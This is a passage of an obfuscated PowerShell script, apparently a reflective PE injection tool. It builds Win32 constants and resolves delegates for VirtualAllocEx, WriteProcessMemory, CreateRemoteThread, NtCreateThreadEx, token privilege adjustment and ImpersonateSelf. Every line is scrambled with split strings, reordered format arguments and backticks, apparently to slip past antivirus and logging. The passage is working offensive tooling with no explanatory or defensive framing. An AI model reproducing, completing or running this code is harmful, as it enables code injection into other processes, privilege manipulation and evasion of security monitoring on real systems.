        ${WiN3`2Co`NST`ANTS} | &("{0}{2}{1}" -f 'Add-Mem','er','b') -MemberType ("{1}{0}{3}{2}" -f 'tePrope','No','ty','r') -Name ("{4}{2}{0}{1}{3}" -f'AGE_FILE','_','M','DLL','I') -Value 0x2000
        ${WIn32`C`ONSTA`NTS} | &("{2}{3}{1}{0}"-f 'er','-Memb','A','dd') -MemberType ("{3}{2}{0}{1}" -f'r','operty','eP','Not') -Name ("{1}{5}{8}{6}{2}{0}{7}{4}{3}" -f 'STICS','IMAG','I','SE','_BA','E_DLL','RACTER','_DYNAMIC','CHA') -Value 0x40
        ${W`IN32`coN`staN`Ts} | &("{1}{0}{2}" -f 'Mem','Add-','ber') -MemberType ("{1}{0}{2}{3}" -f'Prop','Note','ert','y') -Name ("{4}{0}{7}{2}{6}{8}{3}{1}{5}"-f 'GE_DL','ICS_NX_COMP','CHA','RIST','IMA','AT','RA','L','CTE') -Value 0x100
        ${W`In`32`ConSTANtS} | &("{2}{1}{3}{0}"-f'r','dd','A','-Membe') -MemberType ("{3}{2}{0}{1}" -f 'P','roperty','ote','N') -Name ("{0}{2}{3}{1}"-f 'MEM_RE','SE','L','EA') -Value 0x8000
        ${win32c`onstan`Ts} | &("{0}{2}{1}" -f'Add','ber','-Mem') -MemberType ("{3}{1}{0}{2}"-f'Proper','e','ty','Not') -Name ("{1}{0}{2}"-f 'OKEN_QU','T','ERY') -Value 0x0008
        ${w`iN32`c`ONSt`ANts} | &("{0}{2}{1}"-f'Add-','r','Membe') -MemberType ("{2}{0}{1}"-f'otePrope','rty','N') -Name ("{4}{3}{5}{1}{2}{0}" -f'PRIVILEGES','T','_','N_','TOKE','ADJUS') -Value 0x0020
        ${Wi`N32const`An`TS} | &("{2}{1}{0}" -f 'ber','em','Add-M') -MemberType ("{2}{0}{1}"-f'ePro','perty','Not') -Name ("{0}{1}{6}{4}{2}{5}{3}"-f'SE_PRIV','ILEG','B','D','_ENA','LE','E') -Value 0x2
        ${w`iN`32c`o`NSTaNts} | &("{2}{1}{0}"-f 'r','mbe','Add-Me') -MemberType ("{2}{3}{1}{0}" -f 'ty','eProper','N','ot') -Name ("{1}{2}{0}"-f 'EN','ERROR_NO_T','OK') -Value 0x3f0
        
        return ${WI`N3`2`cONSt`ANTS}
    }

    Function gEt-WIn3`2F`UNC`T`IoNS
    {
        ${w`in32F`U`NCtiOnS} = &("{0}{2}{3}{1}" -f 'N','bject','e','w-O') ("{3}{1}{0}{4}{2}" -f'm','yste','ct','S','.Obje')
        
        ${VI`R`TuaLalLOCa`ddr} = &("{0}{2}{3}{1}"-f 'Get-','Address','Pr','oc') ("{2}{1}{3}{0}"-f 'l','rn','ke','el32.dl') ("{0}{1}{2}{3}" -f'Virt','u','al','Alloc')
        ${vI`R`T`UA`lA`llocdELEgaTE} = &("{3}{1}{0}{2}" -f'legateTy','-De','pe','Get') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        ${VirtUaL`A`lloc} =  $zNdO::("{6}{4}{3}{0}{2}{5}{1}"-f 'eForFun','ointer','cti','elegat','etD','onP','G').Invoke(${v`irTUalALL`oCad`dR}, ${ViRtUA`LAlLOCd`Ele`gATe})
        ${w`iN32f`Unc`Ti`ONs} | &("{1}{2}{0}" -f'r','A','dd-Membe') ("{1}{0}{2}"-f 'roper','NoteP','ty') -Name ("{2}{3}{0}{1}" -f'lAl','loc','Virtu','a') -Value ${virtuaL`A`lloC}
        
        ${ViRtu`A`lal`loC`ExAd`DR} = &("{1}{2}{3}{0}{4}"-f 'cAddres','Get','-','Pro','s') ("{1}{2}{3}{0}"-f 'll','kernel','3','2.d') ("{3}{0}{2}{1}"-f'lA','x','llocE','Virtua')
        ${v`IRt`U`AL`AlLO`CE`XDeLeG`ATE} = &("{1}{0}{4}{2}{3}" -f'at','Get-Deleg','y','pe','eT') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        ${Vir`TUalalL`O`CEx} =   (Get-varIAbLe  ZNdo ).vALuE::("{6}{0}{2}{3}{4}{1}{5}{7}" -f'etDele','oin','g','ateForFuncti','onP','t','G','er').Invoke(${ViRT`U`ALalLoCEx`A`d`Dr}, ${Vir`T`UAlA`lLOce`xD`E`leGATe})
        ${win3`2`F`UnctIONs} | &("{1}{2}{0}{3}"-f'-Membe','A','dd','r') ("{0}{1}{2}" -f'No','tePro','perty') -Name ("{4}{1}{3}{2}{0}"-f 'x','irtualAll','E','oc','V') -Value ${vI`RTuALA`L`l`oCeX}
        
        ${MEmCP`yad`DR} = &("{3}{2}{1}{0}" -f's','ddres','et-ProcA','G') ("{0}{1}{2}"-f'ms','vcrt.d','ll') ("{1}{2}{0}"-f 'cpy','m','em')
        ${mE`mCP`yDEl`eGatE} = &("{4}{1}{0}{3}{2}"-f'a','eleg','eType','t','Get-D') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        ${mE`mcPy} =   (  variABLe ("Z"+"NDO")).VaLUE::("{0}{3}{5}{1}{2}{6}{4}"-f 'GetD','ForF','unc','ele','Pointer','gate','tion').Invoke(${mEMcP`y`ADdr}, ${MeMC`Py`DE`leGatE})
        ${w`iN32`FU`NCtio`NS} | &("{2}{3}{0}{1}" -f'mb','er','Add','-Me') -MemberType ("{3}{1}{2}{0}" -f'y','e','Propert','Not') -Name ("{2}{1}{0}"-f 'cpy','m','me') -Value ${MeM`C`PY}
        
        ${M`E`M`seTaDdr} = &("{3}{4}{2}{0}{1}" -f'es','s','ProcAddr','Ge','t-') ("{1}{0}{2}"-f 'rt.d','msvc','ll') ("{1}{0}"-f'et','mems')
        ${mE`msEtDEL`eGAtE} = &("{5}{3}{0}{2}{1}{4}"-f'e','e','gat','l','Type','Get-De') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        ${m`emsET} =   ( VARiAbLe ('z'+'NdO')  -vaLUeONly)::("{4}{3}{7}{1}{0}{2}{6}{5}{8}"-f 'c','rFun','tion','D','Get','oi','P','elegateFo','nter').Invoke(${mE`mSeTa`ddr}, ${m`eMset`DElEGAtE})
        ${WIN3`2fu`NctiO`NS} | &("{1}{2}{0}"-f 'ber','Add','-Mem') -MemberType ("{0}{1}{2}" -f'NoteP','r','operty') -Name ("{0}{1}" -f'mem','set') -Value ${M`EmseT}
        
        ${LoA`dlIBRArYA`DDR} = &("{3}{4}{1}{0}{2}"-f 'd','ocAd','ress','Get-','Pr') ("{1}{2}{3}{0}" -f 'l','k','er','nel32.dl') ("{2}{1}{3}{0}" -f'raryA','L','Load','ib')
        ${LO`ADLi`BRA`R`yDElEg`AtE} = &("{4}{3}{0}{2}{1}"-f '-D','ateType','eleg','t','Ge') @([String]) ([IntPtr])
        ${LoadlIb`R`A`Ry} =  (GET-VarIaBLE  ('z'+'NDo')  -ValUeonLy  )::("{2}{8}{1}{7}{4}{0}{6}{3}{5}" -f'Fu','D','G','tio','or','nPointer','nc','elegateF','et').Invoke(${LOA`DL`IBrARY`Addr}, ${loadLiB`R`ARyD`e`Le`GaTE})
        ${wIN`32fUnct`io`Ns} | &("{2}{0}{1}" -f'-Memb','er','Add') -MemberType ("{1}{3}{2}{0}"-f 'perty','Note','ro','P') -Name ("{1}{2}{3}{0}" -f 'ary','Lo','adLi','br') -Value ${Lo`Ad`lIb`RarY}
        
        ${GETprOCaD`d`R`es`sADDR} = &("{0}{4}{3}{1}{2}"-f 'Ge','rocAddres','s','-P','t') ("{3}{0}{1}{2}"-f 'ernel32.','dl','l','k') ("{3}{4}{1}{0}{2}" -f'dd','ocA','ress','Ge','tPr')
        ${GETP`R`O`cADDRe`SS`deleg`A`TE} = &("{3}{0}{4}{1}{2}"-f't','DelegateT','ype','Ge','-') @([IntPtr], [String]) ([IntPtr])
        ${geTpr`O`CADdr`eSs} =   (DIR  ("VArIa"+"Bl"+"E:Zn"+"do") ).vALUe::("{0}{3}{1}{4}{2}"-f 'GetDele','F','Pointer','gate','orFunction').Invoke(${GeT`p`RoCaDDreSSAD`Dr}, ${G`eT`p`Ro`cadD`Res`sdelEgAte})
        ${wiN32FuNct`iO`NS} | &("{0}{2}{1}"-f 'Add-Mem','r','be') -MemberType ("{3}{1}{0}{2}" -f 'ope','Pr','rty','Note') -Name ("{1}{0}{2}"-f'ddres','GetProcA','s') -Value ${Get`PRoCaDD`R`eSs}
        
        ${Ge`TpR`OCAd`Dre`S`sinT`PtrAD`dR} = &("{0}{1}{3}{2}"-f 'Get-','ProcA','ress','dd') ("{0}{1}{2}"-f'ke','rne','l32.dll') ("{0}{1}{2}{3}"-f'G','e','t','ProcAddress') 
        ${GETp`RocAdD`R`eSS`INtPtRD`el`eg`A`Te} = &("{1}{3}{2}{0}" -f 'e','G','p','et-DelegateTy') @([IntPtr], [IntPtr]) ([IntPtr])
        ${geT`pR`OcAdDReS`sI`NTpTR} =   (  VaRiaBLE ZNdO  -val )::("{4}{3}{0}{1}{6}{5}{7}{2}"-f'tD','e','nPointer','e','G','ForFuncti','legate','o').Invoke(${gEtp`ROca`dDrE`s`siN`T`PT`RaDdr}, ${GEtPrOcAd`dResSInT`P`Tr`DEL`EgATe})
        ${W`in32F`UNC`TIons} | &("{0}{2}{1}" -f 'Add-M','r','embe') -MemberType ("{0}{1}{2}" -f 'No','tePr','operty') -Name ("{2}{3}{0}{1}"-f'ProcAd','dressIntPtr','G','et') -Value ${geTpRo`CadDrE`ss`I`N`TpTr}
        
        ${vi`R`TuA`lfrEEaD`dR} = &("{2}{1}{0}{3}"-f'cAdd','t-Pro','Ge','ress') ("{0}{3}{1}{2}" -f'k','2.dl','l','ernel3') ("{3}{1}{0}{2}" -f 'rtualF','i','ree','V')
        ${virTU`Al`FREEDe`lEgaTe} = &("{0}{1}{3}{2}{4}"-f'Get-Deleg','a','T','te','ype') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        ${VI`Rt`UA`lFREE} =  ( Gci VarIabLe:znDo  ).VALUE::("{1}{0}{2}{3}{6}{5}{4}"-f'Fu','GetDelegateFor','nc','ti','ter','nPoin','o').Invoke(${Vi`RtualfR`E`eAddR}, ${ViRTu`AL`F`REEDElEG`ATE})
        ${wiN32`F`UncTIons} | &("{2}{0}{1}" -f'm','ber','Add-Me') ("{2}{0}{1}"-f'roper','ty','NoteP') -Name ("{0}{2}{1}" -f 'Vi','lFree','rtua') -Value ${v`I`RTUalfR`EE}
        
        ${viRTuAL`FRee`eXaD`dR} = &("{4}{2}{0}{3}{1}" -f 'ocAdd','ss','Pr','re','Get-') ("{1}{2}{3}{0}"-f 'dll','kernel3','2','.') ("{2}{0}{1}{3}" -f 'irtualFre','eE','V','x')
        ${vIrTuaL`FrE`e`EXd`ElEGatE} = &("{0}{2}{3}{1}"-f'Get-','gateType','De','le') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        ${VIR`TU`AlfRe`EeX} =  $ZndO::("{3}{1}{6}{4}{2}{0}{5}{8}{7}" -f 'onPoi','t','ateForFuncti','Ge','eg','n','Del','er','t').Invoke(${VIrTua`l`FRe`e`exA`dDr}, ${Vi`RtUaLF`Ree`ex`DeleGATe})
        ${wi`N32`FU`NCTIonS} | &("{2}{0}{1}" -f 'dd','-Member','A') ("{0}{1}{2}"-f'N','oteP','roperty') -Name ("{1}{2}{3}{0}" -f'x','Virt','ualFr','eeE') -Value ${vir`TUAlfr`e`eeX}
        
        ${vi`RtuaLpro`TeCt`AD`DR} = &("{3}{2}{1}{0}" -f 'dress','d','et-ProcA','G') ("{1}{3}{0}{2}" -f'r','k','nel32.dll','e') ("{2}{1}{0}"-f'lProtect','a','Virtu')
        ${vIr`TuALp`Rote`c`TdELE`GAte} = &("{0}{3}{4}{1}{2}"-f'Get-De','eT','ype','le','gat') @([IntPtr], [UIntPtr], [UInt32],  (VarIable ESqbM).VALue.("{2}{0}{1}"-f'eByR','efType','Mak').Invoke()) ([Bool])
        ${VIr`T`UalP`ROtEct} =   $ZNDo::("{5}{1}{3}{2}{0}{4}" -f 'ctionPoi','Dele','ateForFun','g','nter','Get').Invoke(${VIRT`UAL`pRo`TEcT`Ad`DR}, ${vI`RtuA`LP`R`otec`TD`ElEGA`Te})
        ${Wi`N32`FunC`TIonS} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') ("{2}{1}{0}{3}"-f 'r','rope','NoteP','ty') -Name ("{3}{1}{2}{0}" -f'tect','lPr','o','Virtua') -Value ${vIRT`Ual`PROtecT}
        
        ${GEtmOdUL`ehANDl`E`ADdR} = &("{2}{1}{0}"-f 'Address','t-Proc','Ge') ("{0}{2}{1}"-f'k','32.dll','ernel') ("{0}{3}{1}{2}" -f 'GetModuleHa','le','A','nd')
        ${gEtmodulE`h`ANdledE`Leg`A`TE} = &("{1}{0}{3}{2}" -f'et','G','legateType','-De') @([String]) ([IntPtr])
        ${ge`TMO`DUlE`Ha`NdLE} =  (  ITEM VARiaBLe:Zndo ).VALUe::("{5}{6}{1}{0}{3}{2}{4}"-f 'ForFu','gate','on','ncti','Pointer','GetD','ele').Invoke(${GETm`o`DuLehan`d`LEaddr}, ${gE`TmoDUl`EHANdl`edElE`gate})
        ${W`iN3`2FunCTi`oNs} | &("{1}{2}{0}" -f 'er','Add-','Memb') ("{2}{0}{3}{1}" -f'teP','y','No','ropert') -Name ("{0}{2}{3}{1}"-f 'GetModul','dle','eHa','n') -Value ${g`etMODu`lEha`N`dLe}
        
        ${FRe`eli`Br`ARyaddR} = &("{2}{1}{0}"-f'ess','et-ProcAddr','G') ("{0}{2}{1}" -f 'k','dll','ernel32.') ("{1}{0}{3}{2}"-f 'ra','FreeLib','y','r')
        ${FReeLib`RA`RYDEl`eGate} = &("{1}{3}{2}{0}" -f'pe','G','-DelegateTy','et') @([Bool]) ([IntPtr])
        ${F`REeL`i`BRaRY} =   $zndo::("{5}{7}{3}{0}{2}{4}{1}{6}" -f'orF','nP','u','ateF','nctio','Get','ointer','Deleg').Invoke(${freElI`BRa`RYaD`Dr}, ${fRee`LiBraRY`d`e`LegaTe})
        ${Win`3`2`FUnctio`Ns} | &("{0}{2}{1}" -f'Ad','r','d-Membe') -MemberType ("{3}{0}{2}{1}"-f 'eProper','y','t','Not') -Name ("{2}{0}{1}"-f 'eLi','brary','Fre') -Value ${Fre`ElIb`R`ArY}
        
        ${Op`eN`p`RocEssAddR} = &("{2}{0}{1}"-f'ProcAddres','s','Get-') ("{1}{2}{0}" -f 'll','kern','el32.d') ("{0}{3}{1}{2}" -f'OpenP','oce','ss','r')
        ${o`PEnPr`OCessDEleg`ATe} = &("{1}{2}{0}{4}{3}" -f 'eg','Get-De','l','eType','at') @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${oPen`P`Rocess} =   (Ls  ("VaR"+"Ia"+"BLe:zndo")  ).VaLUE::("{8}{7}{1}{5}{6}{4}{0}{3}{2}"-f 'oint','F','r','e','ionP','orFunc','t','e','GetDelegat').Invoke(${OPE`NPRO`CEs`SadDr}, ${Op`E`NprOC`E`sS`D`ELeGatE})
        ${wI`N32FUNct`I`o`Ns} | &("{3}{2}{1}{0}" -f 'ber','Mem','d-','Ad') -MemberType ("{1}{0}{2}"-f 'er','NoteProp','ty') -Name ("{0}{3}{1}{2}"-f 'Open','roce','ss','P') -Value ${OpEnproc`E`SS}
        
        ${waiTFO`RsIngleOBje`Ct`A`dDr} = &("{0}{2}{1}{3}"-f 'G','ddre','et-ProcA','ss') ("{3}{2}{0}{1}"-f '32.dl','l','el','kern') ("{2}{3}{1}{0}"-f 'ect','leObj','WaitF','orSing')
        ${wai`TF`o`RsINGL`EOBJ`eCT`del`eGa`TE} = &("{3}{2}{1}{0}{4}" -f 'eTyp','at','eleg','Get-D','e') @([IntPtr], [UInt32]) ([UInt32])
        ${WaiTFoRS`ing`LE`obJ`ecT} =   (  geT-VARiabLe ("Z"+"ndO")  ).vaLUe::("{1}{4}{2}{0}{3}{5}{6}" -f'F','G','egate','orF','etDel','unc','tionPointer').Invoke(${wAITFOrSingl`eO`B`JeCT`ADdr}, ${W`AItFORSiN`gl`e`oBj`ecT`deLEG`Ate})
        ${W`In32`FunCt`IO`NS} | &("{2}{0}{1}"-f 'd-','Member','Ad') -MemberType ("{0}{3}{2}{1}"-f'No','perty','ePro','t') -Name ("{4}{0}{3}{1}{5}{2}"-f 'it','Sing','t','For','Wa','leObjec') -Value ${wAitForSi`NGL`EoB`JeCt}
        
        ${WRitep`R`Oces`s`MEmOr`yA`Ddr} = &("{1}{2}{0}{3}" -f're','G','et-ProcAdd','ss') ("{0}{1}{2}{3}" -f'ke','r','nel32.dl','l') ("{3}{0}{1}{4}{2}" -f 'r','iteP','ocessMemory','W','r')
        ${WritE`p`ROCEsSMEMoR`yd`e`lEG`ATe} = &("{2}{1}{4}{3}{0}" -f 'egateType','-D','Get','l','e') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (lS VARiAble:cR98P  ).vaLue.("{0}{2}{1}"-f 'Make','fType','ByRe').Invoke()) ([Bool])
        ${w`RItE`pR`OCesSM`E`MOry} =   (  GET-ITEm ('v'+'ArI'+'able'+':zndO')  ).vaLUe::("{1}{2}{0}{3}{4}" -f'g','Ge','tDele','at','eForFunctionPointer').Invoke(${wRItEp`RO`C`E`S`S`mEMorya`DDr}, ${WrIT`ePrOceS`SM`EMo`RYDELeGAte})
        ${W`I`N32fUncT`IO`Ns} | &("{0}{2}{1}"-f'Ad','er','d-Memb') -MemberType ("{1}{0}{2}" -f't','No','eProperty') -Name ("{3}{1}{5}{4}{0}{2}" -f'Memo','P','ry','Write','s','roces') -Value ${wrI`T`eP`RocesSm`eMO`RY}
        
        ${REa`DPROCES`S`MeMO`RyA`DDr} = &("{0}{2}{1}{3}" -f'Get-Pr','dr','ocAd','ess') ("{1}{2}{0}"-f'.dll','k','ernel32') ("{3}{2}{1}{0}"-f'mory','e','M','ReadProcess')
        ${rEADp`R`oCeSSMem`OrY`de`legATe} = &("{2}{3}{0}{1}"-f'eTyp','e','Get','-Delegat') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (vArIAbLE  ("c"+"r98P")).vALue.("{3}{2}{0}{1}"-f'eByR','efType','ak','M').Invoke()) ([Bool])
        ${rEADPROCeSS`mEM`O`RY} =   (CHIldITEm  ("V"+"a"+"rI"+"abl"+"E:ZnDo")).Value::("{2}{0}{4}{3}{1}"-f'n','Pointer','GetDelegateForFu','tion','c').Invoke(${REa`Dp`RoCEs`s`mEM`oryaDdr}, ${R`EaDpr`oCE`Ss`mEM`O`RYDElEGa`TE})
        ${wIn`3`2FU`N`ctioNS} | &("{1}{0}{2}{3}"-f 'M','Add-','embe','r') -MemberType ("{3}{0}{2}{1}" -f'ot','y','ePropert','N') -Name ("{3}{0}{1}{2}" -f'adPro','cessM','emory','Re') -Value ${rEAD`P`Roc`ESsmemOrY}
        
        ${c`REAT`eR`EMOTEt`H`R`eaDadDR} = &("{2}{1}{0}{3}"-f 'cA','o','Get-Pr','ddress') ("{0}{1}{2}" -f 'ker','ne','l32.dll') ("{3}{1}{2}{0}" -f 'read','ateR','emoteTh','Cre')
        ${creATEr`E`mo`T`eT`HreA`ddELE`GaTe} = &("{0}{3}{2}{1}"-f 'G','eType','-Delegat','et') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CrEa`Ter`e`MotETHrEad} =  $ZnDO::("{6}{3}{5}{2}{4}{0}{1}"-f'oin','ter','ct','egateFo','ionP','rFun','GetDel').Invoke(${crEATeREMOTEtH`R`E`AD`Ad`Dr}, ${Cr`EAtEremOtEt`H`ReA`DDeleg`A`Te})
        ${wI`N3`2`FUNcti`oNs} | &("{2}{3}{1}{0}" -f'er','b','Add-Me','m') -MemberType ("{3}{0}{1}{2}"-f 'te','Pro','perty','No') -Name ("{3}{2}{0}{1}"-f'eThr','ead','eRemot','Creat') -Value ${C`ReATEREmo`Te`ThrEAD}
        
        ${g`ETE`XitcODETH`REad`A`dDR} = &("{0}{2}{1}" -f 'Get-Pr','s','ocAddres') ("{2}{3}{1}{0}"-f'll','el32.d','ke','rn') ("{3}{0}{2}{1}" -f'tExitC','eThread','od','Ge')
        ${geTEXiTC`ODe`THrE`Adde`l`egAtE} = &("{0}{3}{2}{1}" -f 'Get-Del','e','Typ','egate') @([IntPtr],  $tDPZ.("{1}{2}{0}"-f'pe','Make','ByRefTy').Invoke()) ([Bool])
        ${geTeXiTC`oDeTh`Re`AD} =  $zndo::("{4}{1}{2}{3}{5}{0}{6}" -f 'nPoint','or','Func','ti','GetDelegateF','o','er').Invoke(${GEtEx`itcODEt`HrEaD`AD`dR}, ${Get`EX`Itc`odeTHrE`AD`dEl`EgATE})
        ${W`iN32Fu`Nc`TIoNS} | &("{3}{0}{2}{1}"-f '-M','er','emb','Add') -MemberType ("{0}{1}{2}{3}" -f 'N','o','tePro','perty') -Name ("{3}{1}{2}{0}" -f 'ead','tE','xitCodeThr','Ge') -Value ${g`et`Exitco`deThr`e`Ad}
        
        ${O`Pe`NtH`REaDToKENa`dDR} = &("{2}{1}{0}{3}{4}"-f 'ocAd','-Pr','Get','d','ress') ("{2}{3}{1}{0}"-f '.dll','2','Ad','vapi3') ("{1}{3}{0}{2}"-f'eadTo','O','ken','penThr')
        ${O`pen`T`HReADT`OKe`Ndel`e`GaTE} = &("{3}{5}{1}{0}{2}{4}"-f'legateTy','De','p','G','e','et-') @([IntPtr], [UInt32], [Bool],  $PEfZ6j.("{0}{2}{1}{3}" -f 'Mak','yR','eB','efType').Invoke()) ([Bool])
        ${OPeNtHr`E`AdTo`kEN} =   (  GeT-VarIAble ZNdo).VaLUe::("{3}{5}{7}{2}{4}{6}{1}{8}{0}"-f 'ter','tion','e','Ge','gateFo','tDe','rFunc','l','Poin').Invoke(${oP`enth`RE`AdTOke`NADDR}, ${openTh`ReA`D`TOKende`lE`G`Ate})
        ${wi`N32FUNCTI`ONs} | &("{0}{2}{1}" -f'Add-Me','ber','m') -MemberType ("{0}{2}{3}{1}"-f'NoteP','y','ro','pert') -Name ("{1}{0}{2}"-f 'e','OpenThr','adToken') -Value ${OPe`Nt`Hr`EAdt`o`ken}
        
        ${G`ETCUrRE`NTT`hReA`dAdDr} = &("{0}{2}{4}{3}{1}" -f'Get-','dress','Pro','d','cA') ("{0}{1}{3}{2}"-f 'kernel','32','dll','.') ("{4}{1}{3}{0}{2}"-f't','t','Thread','Curren','Ge')
        ${Ge`TcUR`REnTth`Re`ADd`ele`g`ATE} = &("{4}{1}{3}{2}{0}"-f'pe','et-','Ty','Delegate','G') @() ([IntPtr])
        ${geTC`Ur`R`ENttHREAd} =   (vArIable ('znD'+'o')).VAlue::("{6}{5}{0}{4}{7}{3}{2}{1}" -f'teFor','ter','oin','nP','F','ega','GetDel','unctio').Invoke(${GeTcUR`ReNT`TH`R`EA`Dad`Dr}, ${Get`CUrREntTh`ReA`DDEleG`ATe})
        ${w`In32`F`UncTIoNS} | &("{0}{1}{2}" -f'Add-Mem','b','er') -MemberType ("{1}{2}{0}" -f 'rty','NoteProp','e') -Name ("{2}{4}{0}{1}{3}"-f'entT','hre','Get','ad','Curr') -Value ${G`et`cURr`eNTT`hre`AD}
        
        ${aDj`Us`TtOk`EnPriVi`l`EGEsA`ddR} = &("{2}{1}{0}" -f 'ocAddress','r','Get-P') ("{2}{0}{1}"-f'2.dl','l','Advapi3') ("{3}{0}{1}{2}"-f 'justT','ok','enPrivileges','Ad')
        ${Ad`JusttoKenp`R`Iv`ILeGE`SD`El`e`GaTe} = &("{2}{1}{3}{0}" -f'ateType','et-Dele','G','g') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${AdJ`Us`TtokE`N`pRiVile`g`es} =   (IteM ("VAR"+"iabLe:Z"+"n"+"dO") ).vAlUe::("{4}{3}{5}{6}{2}{1}{0}" -f'ter','in','o','ele','GetD','gateForFunctio','nP').Invoke(${AdjuS`TTokenpr`IvileG`ESA`DdR}, ${AD`jUSttO`kEn`priVi`l`EgESDeLeGatE})
        ${w`in32FUN`cT`Io`NS} | &("{0}{1}{2}"-f'Ad','d-Mem','ber') -MemberType ("{0}{2}{1}" -f'No','y','tePropert') -Name ("{0}{5}{4}{1}{2}{3}{6}"-f'Adj','t','TokenPri','vile','s','u','ges') -Value ${aDJ`USTtok`e`NPr`I`ViLEgeS}
        
        ${LooKuPprI`V`ILe`Ge`VaL`UEA`Ddr} = &("{2}{0}{1}{3}" -f't-','ProcA','Ge','ddress') ("{1}{2}{3}{0}" -f'l','Ad','vap','i32.dl') ("{3}{1}{4}{0}{2}{5}" -f 'rivileg','u','eValue','Look','pP','A')
        ${LooKUP`p`R`iViLege`V`ALUeDEL`e`G`Ate} = &("{2}{0}{4}{1}{3}" -f'-D','legateTy','Get','pe','e') @([String], [String], [IntPtr]) ([Bool])
        ${L`OokUpPRiViLEgev`Al`UE} =   (CHilDITeM ('vaRI'+'aBLE:'+'zND'+'O')  ).value::("{5}{4}{6}{3}{0}{7}{1}{2}{8}" -f 'eg','Fo','r','l','et','G','De','ate','FunctionPointer').Invoke(${L`oOk`UpP`R`Iv`IL`egEValuE`ADDr}, ${L`OokUP`p`RIvI`LE`gEVALu`edeLEG`ATe})
        ${WiN32F`Unc`TioNS} | &("{2}{1}{0}"-f 'r','e','Add-Memb') -MemberType ("{2}{1}{0}"-f'roperty','P','Note') -Name ("{3}{5}{2}{4}{1}{0}"-f 'Value','ege','ku','Lo','pPrivil','o') -Value ${loOkuP`pr`iv`ilege`V`Alue}
        
        ${iM`PER`So`NaTese`l`FaDdr} = &("{2}{0}{1}" -f '-ProcAd','dress','Get') ("{0}{1}{2}" -f'Advapi32','.dl','l') ("{1}{0}{2}{3}{4}"-f'r','Impe','s','onat','eSelf')
        ${Im`PE`RsOnATE`SeLfd`ElegA`TE} = &("{1}{3}{2}{0}"-f'teType','Get','a','-Deleg') @([Int32]) ([Bool])
        ${ImPERson`A`T`E`SeLf} =  (  gEt-vaRiABLe  zndo).Value::("{0}{5}{3}{4}{1}{2}"-f 'Get','o','inter','legate','ForFunctionP','De').Invoke(${IMpeRSo`Nat`eSel`F`AdDr}, ${iMpERSONAtE`s`ElFdEl`eg`ATe})
        ${Win3`2f`U`Nc`TiONs} | &("{2}{1}{0}"-f 'r','Membe','Add-') -MemberType ("{3}{0}{2}{1}"-f'eProp','rty','e','Not') -Name ("{2}{4}{0}{1}{3}" -f'e','rsonate','I','Self','mp') -Value ${ImPER`So`NAT`E`SE`lf}
        
        ${NtCreATEtH`RE`ADEX`A`d`DR} = &("{1}{0}{2}{3}"-f 'et-Proc','G','Addre','ss') ("{0}{1}"-f 'NtDll.','dll') ("{2}{0}{4}{3}{1}"-f'tCr','adEx','N','eThre','eat')
        ${nT`CreatEthR`ea`d`E`xD`eLegAtE} = &("{2}{4}{0}{1}{3}{5}" -f 'eleg','ateT','Ge','yp','t-D','e') @( (  GcI  vAriaBle:PeFz6j ).VaLUe.("{2}{0}{3}{4}{1}" -f 'e','e','Mak','ByR','efTyp').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        ${n`TC`REAte`ThRE`A`DeX} =  $zNDO::("{4}{2}{1}{6}{3}{5}{0}" -f 'inter','leg','etDe','un','G','ctionPo','ateForF').Invoke(${NTcRe`AtetHr`E`A`DExAddr}, ${ntc`R`E`A`TetHread`exD`eLEgA`TE})
        ${W`I`N32fuNc`TI`oNS} | &("{0}{1}{2}"-f 'Add-','Me','mber') -MemberType ("{2}{0}{3}{1}" -f'o','ty','NotePr','per') -Name ("{0}{1}{4}{2}{3}"-f'NtC','reateThre','dE','x','a') -Value ${nT`cr`EATE`ThR`EaDEX}
        
        ${ISW`ow`64p`RO`CE`ssADdR} = &("{3}{0}{2}{1}" -f '-ProcAdd','ss','re','Get') ("{2}{1}{0}"-f '.dll','l32','Kerne') ("{0}{2}{4}{3}{1}"-f 'IsWo','s','w64P','s','roce')
        ${iSwow`64pr`OcE`SSD`eLeGaTe} = &("{2}{0}{1}{4}{3}"-f '-Deleg','ate','Get','pe','Ty') @([IntPtr],   $5Z2q.("{1}{0}{2}"-f 'keByRe','Ma','fType').Invoke()) ([Bool])
        ${iS`WOw6`4prOcE`SS} =   ( GCi vArIaBle:znDo ).ValUe::("{2}{3}{1}{5}{0}{6}{4}"-f'ForF','e','GetDe','l','r','gate','unctionPointe').Invoke(${IswO`w`64PrOcE`sSad`Dr}, ${I`SwO`W64`ProceSsdE`l`egATe})
        ${w`i`N32funCT`IoNs} | &("{1}{0}{3}{2}"-f'd','A','r','d-Membe') -MemberType ("{3}{1}{2}{0}"-f'y','ote','Propert','N') -Name ("{1}{2}{3}{0}"-f 'ss','IsWow','64P','roce') -Value ${I`swOw6`4PRoCe`ss}
        
        ${Cr`Ea`TE`ThREa`daddR} = &("{4}{0}{2}{3}{1}" -f 't','s','-ProcA','ddres','Ge') ("{1}{0}{2}" -f'nel32.dl','Ker','l') ("{2}{3}{1}{0}"-f'read','h','Cre','ateT')
        ${C`ReAtET`hr`eADdeleGA`TE} = &("{0}{2}{3}{4}{1}"-f'Ge','pe','t-Del','egat','eTy') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   $EsqBm.("{3}{2}{1}{0}"-f'Type','f','Re','MakeBy').Invoke()) ([IntPtr])
        ${crE`At`eThRE`AD} =   (  VARiablE ('zN'+'DO')).vaLue::("{2}{1}{0}{6}{4}{3}{7}{5}" -f'DelegateFo','et','G','nctionP','u','r','rF','ointe').Invoke(${Cr`EA`TeT`HrEAdA`DDr}, ${C`ReAteT`HREaD`d`eLEGATe})
